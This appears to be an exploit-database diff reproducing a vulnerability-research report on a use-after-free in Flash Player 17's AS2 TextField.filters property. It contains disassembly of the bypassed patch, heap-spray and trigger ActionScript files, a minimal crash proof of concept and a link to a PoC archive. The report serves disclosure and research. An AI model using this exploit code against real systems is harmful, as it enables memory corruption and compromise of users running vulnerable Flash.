@@ -1,0 +1,148 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=330&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+[Tracking for: https://code.google.com/p/chromium/issues/detail?id=476926]
+
+Credit is to bilou, working with the Chromium Vulnerability Rewards Program.
+
+---
+VULNERABILITY DETAILS
+There is a use after free vulnerability in the ActionScript 2 TextField.filters array property.
+
+This is Issue 457278 resurrected.
+
+VERSION
+Chrome Version: [?, Flash 17.0.0.169]
+Operating System: [Windows 7 x64 SP1]
+
+REPRODUCTION CASE
+When the TextField.filters array is set, Flash creates an internal array holding the filters. When the property is read, Flash iterates over this array and clones each filter. During this loop, it is possible to execute some AS2 by overriding a filter's constructor. At that moment, if the AS2 code alters the filters array, Flash frees the internal array leaving a reference to freed memory in the stack. When the execution flow resumes to the loop, a use-after-free occurs.
+Note: Flash 17.0.0.169 tried to patch the previous issue by setting an "in used" flag on the targeted filter (flashplayer17_sa.exe 17.0.0.169):
+
+.text:004D67F8                 mov     esi, [esp+1Ch+var_4]
+.text:004D67FC                 push    1               ; char
+.text:004D67FE                 mov     ecx, ebp        ; int
+.text:004D6800                 mov     byte ptr [esi+0Ch], 1   // this flag was added
+.text:004D6804                 call    xparseAS2Code
+.text:004D6809                 mov     byte ptr [esi+0Ch], 0
+
+And when we check the function that deletes the filters:
+
+.text:004D66D0                 push    edi
+.text:004D66D1                 mov     edi, ecx
+.text:004D66D3                 cmp     byte ptr [edi+0Ch], 0  // check again the flag, and jump if it is set, so that the filter won't be deleted
+.text:004D66D7                 jnz     short loc_4D6716
+.text:004D66D9                 cmp     dword ptr [edi], 0
+.text:004D66DC                 jz      short loc_4D6708
+
+We can bypass that feature with the following code:
+
+flash.filters.GlowFilter = MyGlowFilter
+var a = tfield.filters   // set the flag to 1
+
+--- in MyGlowFilter ---
+	flash.filters.GlowFilter = MyGlowFilter2
+	var a = _global.tfield.filters   // set the flag to 1, and then set it to 0
+    
+    //now we can free the filter :D, the flag is set to 0!
+    _global.tfield.filters = []
+
+
+Tested on Flash Player standalone 17.0.0.169, the updated Chrome is not available at the time of writing.
+But since the objects haven't changed too much the updated version should crash while dereferencing 0x41424344.
+
+Can't we call that a -1day :D?
+
+***************************************************************************
+Content of FiltusPafusBis.fla
+
+import flash.filters.GlowFilter;
+
+var a1:Array = new Array()
+var a2:Array = new Array()
+for (i = 0; i<0x50/4;i++) {
+	a2[i] = 0x41424344
+}
+
+for (var i = 0; i<0x200;i++) {
+	var tf:TextFormat = new TextFormat()
+	a1[i] = tf
+}
+for (var i = 0; i<0x200;i++) {
+	a1[i].tabStops = a2
+}
+
+var tfield:TextField = createTextField("tf",1,1,2,3,4)
+var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)
+tfield.filters = [glowfilter]
+
+
+function f() {
+	for (var i = 0; i<0x20;i++) {
+		_global.a1[0x100+i*4].tabStops = [1,2,3,4]
+	}
+	flash.filters.GlowFilter = MyGlowFilter2
+	var a = _global.tfield.filters
+	
+	_global.tfield.filters = []
+	for (var i = 0; i<0x200;i++) {
+		_global.a1[i].tabStops = a2
+	}
+	
+}
+
+_global.tfield = tfield
+_global.f = f
+_global.a1 = a1
+_global.a2 = a2
+
+flash.filters.GlowFilter = MyGlowFilter
+var a = tfield.filters
+
+***************************************************************************
+Content of MyGlowFilter.as:
+
+import flash.filters.GlowFilter;
+class MyGlowFilter extends flash.filters.GlowFilter {
+       public function MyGlowFilter (a,b,c,d,e,f,g,h) 
+       {
+            super(a,b,c,d,e,f,g,h);
+            _global.f()
+       }
+}
+
+***************************************************************************
+Content of MyGlowFilter2.as:
+
+import flash.filters.GlowFilter;
+class MyGlowFilter2 extends flash.filters.GlowFilter {
+       public function MyGlowFilter2 (a,b,c,d,e,f,g,h) 
+       {
+            super(a,b,c,d,e,f,g,h);
+       }
+}
+
+***************************************************************************
+Content of FiltusPafusBis_poc.fla
+
+import flash.filters.GlowFilter;
+
+var tfield:TextField = createTextField("tf",1,1,2,3,4)
+var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)
+tfield.filters = [glowfilter]
+
+function f() {
+    flash.filters.GlowFilter = MyGlowFilter2
+	var a = _global.tfield.filters
+	_global.tfield.filters = []
+}
+
+_global.tfield = tfield
+_global.f = f
+
+flash.filters.GlowFilter = MyGlowFilter
+var a = tfield.filters
+---
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37847.zip
+
